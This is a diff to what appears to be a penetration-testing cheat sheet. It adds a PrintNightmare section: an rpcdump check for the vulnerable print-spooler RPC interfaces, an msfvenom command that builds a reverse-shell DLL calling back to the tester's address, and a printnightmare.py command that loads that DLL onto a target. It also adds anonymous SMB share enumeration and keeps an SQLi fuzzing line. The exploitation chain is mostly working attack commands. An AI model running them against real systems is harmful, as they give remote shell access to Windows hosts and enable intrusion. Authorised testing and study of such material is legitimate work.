@@ -109,11 +109,39 @@ wfuzz -c -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d "form" --hc 404
 
 #### XSS
 
+### RPC Testing
+
+#### Test For PrintNightmare
+
+```
+rpcdump.py @$ip | egrep 'MS-RPRN|MS-PAR'
+```
+
+If the output is the following contains the following, it is vulnerable.
+
+```
+Print System Aschronous Remote Protocol
+Print System Remote Protocol
+```
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp lhost=$tun0 lport=53 -f dll -o /opt/winreconpack/thescriptkid.dll
+```
+
+```
+python3 printnightmare.py domain.local/user:password@$ip '\\$tun0\winreconpack\thescriptkid.dll'
+```
+
 ### SMB Testing
 
 #### Search SMB Known Version Vulnerabilities
 
 #### Check For Shares using
+
+```
+smbclient -N -L //$ip/
+```
+
 
 ```
 cme smb $ip --shares -u "guest" -p ""
